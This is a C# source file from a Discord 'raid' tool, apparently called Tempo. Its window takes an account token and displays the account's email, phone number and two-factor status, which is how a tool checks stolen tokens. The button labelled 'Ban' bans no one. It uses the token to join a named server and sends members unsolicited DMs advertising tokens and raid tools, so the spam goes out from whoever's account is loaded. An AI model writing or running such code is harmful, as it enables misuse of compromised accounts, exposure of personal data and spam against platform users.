using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using TempoWithGUI.MVVM.View.RaidView;
using TempoWithGUI.MVVM.ViewModel;

namespace TempoWithGUI.MVVM.View
{
    /// <summary>
    /// Interaction logic for TokenRaid.xaml
    /// </summary>
    public partial class TokenRaid : Window
    {
        public bool banning { get; set; } = false;
        public bool isGettingInfo { get; set; }
        public TokenRaid()
        {
            InitializeComponent();
            Debug.Log("Token info interface initialized");
            if (UserLbl.Text == "")
                UserLbl.Text = "N/A";
            if (EmailLbl.Text == "")
                EmailLbl.Text = "N/A";
            if (VerifiedLbl.Text == "")
                VerifiedLbl.Text = "N/A";
            if (PhoneLbl.Text == "")
                PhoneLbl.Text = "N/A";
            if (TwoFAuthLbl.Text == "")
                TwoFAuthLbl.Text = "N/A";
            if (TypeLbl.Text == "")
                TypeLbl.Text = "N/A";
            if (UserLbl.Text == "")
                UserLbl.Text = "N/A";
            if (UsernameLbl.Text == "")
                UsernameLbl.Text = "N/A";
        }
        private void Start_Click(object sender, RoutedEventArgs e)
        {
            if (isGettingInfo)
                return;
            this.Cursor = Cursors.AppStarting;
            string token = TokenIn.Text;
            DiscordClient client = null;
            try
            {
                client = new DiscordClient(token);
            }
            catch
            {
                MessageBox.Show("Please use a valid token");
                return;
            }
            var user = client.User;
            var user_id = user.Id.ToString();
            var isBot = user.Type;
            var phone = user.PhoneNumber;
            var country = user.RegistrationLanguage;
            var email = user.Email;
            var isEmailVerified = user.EmailVerified;
            var twoFactorAuth = user.TwoFactorAuth;
            var discr = user.Discriminator.ToString();
            for(int i = 0; i < 4 - discr.Length; i++)
            {
                discr = "0" + discr;
            }
            var username = user.Username + "#" + discr;

            UserLbl.Text = user_id;
            TypeLbl.Text = isBot.ToString();
            if(phone != null)
                PhoneLbl.Text = phone;
            TwoFAuthLbl.Text = twoFactorAuth.ToString();
            EmailLbl.Text = email;
            VerifiedLbl.Text = isEmailVerified.ToString();
            UsernameLbl.Text = username;
            this.Cursor = Cursors.Arrow;
        }
        private void Ban_Click(object sender, RoutedEventArgs e)
        {
            if (banning)
                return;
            string token = TokenIn.Text;
            var client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 9, HandleIncomingMediaData = false });
            try
            {
                client.Login(token);
            }
            catch
            {
                MessageBox.Show("Please use a valid token");
                return;
            }
            this.Cursor = Cursors.AppStarting;
            Task.Run(() =>
            {
                string request_url = "https://discord.com/api/v9/invites/edgy";
                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("Authorization", token);
                httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");

                try
                {
                    httpClient.PostAsync(request_url, null).GetAwaiter().GetResult();
                    var (guildId, channelWelcomeId) = JoinGuild.Get_GuildID("edgy");
                    var guild = client.GetGuild(ulong.Parse(guildId));
                    var random = new Random();
                    var channel = guild.GetChannels()[random.Next(0, guild.GetChannels().Count)];
                    while (channel.IsVoice)
                        channel = guild.GetChannels()[random.Next(0, guild.GetChannels().Count)];
                    var members = client.GetGuildChannelMembers(guild.Id, channel.Id, 10);
                    foreach (var member in members)
                    {
                        client.CreateDM(member.User.Id).SendMessage("Come check out Tempo on our official server to get discord tokens or raid tools --> https://discord.gg/J3YfxWUX");
                    }
                }
                catch { }
                Dispatcher.Invoke(() =>
                {
                    this.Cursor = Cursors.Arrow;
                });
                banning = false;
            });
        }
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (Mouse.LeftButton == MouseButtonState.Pressed)
                this.DragMove();
        }
        private void ExitButton_Click(object sender, RoutedEventArgs e)
        {
            RaidModel.tokenOn = false;
            this.Hide();
        }
    }
}
